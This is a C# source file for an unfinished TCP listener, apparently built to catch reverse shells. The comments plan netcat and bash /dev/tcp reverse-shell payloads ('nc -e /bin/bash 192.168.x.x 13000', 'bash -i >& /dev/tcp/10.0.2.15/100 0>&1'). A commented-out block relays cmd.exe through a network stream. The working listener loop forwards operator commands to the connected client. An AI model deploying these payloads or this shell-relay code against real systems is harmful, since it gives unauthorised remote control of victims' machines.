using System;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

//LOWDOWN:
//- Need to accept input on listener side
//- Maybe find a way to enter a command for the shell to execute once connected??
//- Also find a way to code a payload for netcat eg: nc 192.xxx.x.x 0000 - maybe use bash command along side?
//- command to execute linux side i'm pretty sure will be - 'nc -e /bin/bash 192.168.x.x 13000'

namespace tcp_listener
{
    class Program
    {
        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            Console.Write(@"
  _______              _       _______ _____ _____    _ _     _                       
 |__   __|            ( )     |__   __/ ____|  __ \  | (_)   | |                      
    | | ___  _ __ ___ |/ ___     | | | |    | |__) | | |_ ___| |_ ___ _ __   ___ _ __ 
    | |/ _ \| '_ ` _ \  / __|    | | | |    |  ___/  | | / __| __/ _ \ '_ \ / _ \ '__|
    | | (_) | | | | | | \__ \    | | | |____| |      | | \__ \ ||  __/ | | |  __/ |   
    |_|\___/|_| |_| |_| |___/    |_|  \_____|_|      |_|_|___/\__\___|_| |_|\___|_|   
                                                                                      
                                                                                      ");
            //font - big
            //script payload command to connect
            tcp();
        }
        static void tcp()
        {
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.ipaddress.parse?redirectedfrom=MSDN&view=net-5.0#System_Net_IPAddress_Parse_System_String_
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener.-ctor?view=net-5.0#System_Net_Sockets_TcpListener__ctor_System_Net_IPAddress_System_Int32_
            Console.WriteLine("\nEnter the port you want to start the process on...");
            int portno = Convert.ToInt32(Console.ReadLine());
            
            Console.WriteLine("Enter the IPv4 address you want to listen for (local address)...");
            string iplocal = Console.ReadLine();
            
            Console.WriteLine("Is this okay? y/n");
            string conf = Console.ReadLine();
            
            Console.WriteLine("\nIP Address:\n" + iplocal);
            Console.WriteLine("Port:\n" + portno);
            
            if (conf == "y")
            {
                TcpListener server = null;
                try
                {
                    //initialise tcp on entered port
                    Int32 port = portno;
                    IPAddress localAddr = IPAddress.Parse(iplocal);

                    // TcpListener server = new TcpListener(port);
                    server = new TcpListener(localAddr, port);

                    // Start listening for client requests.
                    server.Start();

                    // Buffer for reading data
                    Byte[] bytes = new Byte[256];
                    String data = null;

                    // Enter the listening loop.
                    while (true)
                    {
                        Console.Write("\n\nWaiting for a connection on " + portno);

                        // Perform a blocking call to accept requests.
                        // You could also use server.AcceptSocket() here.
                        TcpClient client = server.AcceptTcpClient();
                        Console.WriteLine("\nConnected!");

                        data = null;

                        // Get a stream object for reading and writing
                        NetworkStream stream = client.GetStream();

                        int i;
                        //for reference https://www.puckiestyle.nl/c-simple-reverse-shell/
                        /*while (client.Connected)
                        {
                            using (StreamReader rdr = new StreamReader(stream))
                            {
                                streamWriter = new StreamWriter(stream);

                                StringBuilder strInput = new StringBuilder();

                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new DataReceivedEventHandler(output);
                                p.Start();
                                p.BeginOutputReadLine();

                                while (true)
                                {
                                    strInput.Append(rdr.ReadLine());
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                    strInput.Remove(0, strInput.Length);
                                }
                            }
                        }*/
                        // Loop to receive all the data sent by the client.
                        
                        while (client.Connected)
                        {
                            //MAKING PROGRESS - need to put it in a loop so it doesn't just process one command
                            //use above example for help
                            //ALSO new payload needs to be - nc -e /bin/bash 192.XXX.X.X 13000
                            //https://docs.microsoft.com/en-us/dotnet/api/system.io.streamwriter.-ctor?view=net-5.0#System_IO_StreamWriter__ctor_System_IO_Stream_

                            Byte[] newbytes = new Byte[256];
                            streamWriter = new StreamWriter(stream);
                            StringBuilder userinput = new StringBuilder();
                            StreamReader rdr = new StreamReader(stream);

                            using (rdr)
                            {
                                string text = Console.ReadLine();
                                streamWriter.WriteLine(text);
                                streamWriter.Flush();

                            }

                            //string text = Console.ReadLine();
                            /*if (text == "deployshell")
                            {
                                //bash??? = "bash -i >& /dev/tcp/10.0.2.15/100 0>&1";
                                string te = "ls\n";
                                byte[] msg = System.Text.Encoding.ASCII.GetBytes(te);
                                stream.Write(msg, 0, msg.Length);
                            }*/
                        }

                        /*while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // Translate data bytes to a ASCII string.
                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            Console.WriteLine(data);

                            // Process the data sent by the client.
                            //data = data.ToUpper();

                            byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                            //data = Console.ReadLine();

                            stream.Read(msg, 0, msg.Length);

                            // Send back a response.
                            stream.Write(msg, 0, msg.Length);
                            Console.WriteLine("Sent: {0}", data);
                        }*/

                        

                        // Shutdown and end connection
                        client.Close();
                    }
                }
                catch (SocketException e)
                {
                    Console.WriteLine("\nERROR!\n");
                    Console.WriteLine(" SocketException: {0}", e);
                }
                catch (Exception ex)
                {
                    //pointless?
                    Console.WriteLine("exception: {0}", ex);
                }
                finally
                {
                    // Stop listening for new clients.
                    server.Stop();
                }

                Console.WriteLine("\nHit enter to continue...");
                Console.Read();
            }

            else
            {
                Console.WriteLine("Canceled! abandoning...");
                //return;
            }
        }

        private static void output(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine("exception");
                }
            }
        }

    }
    
    
}
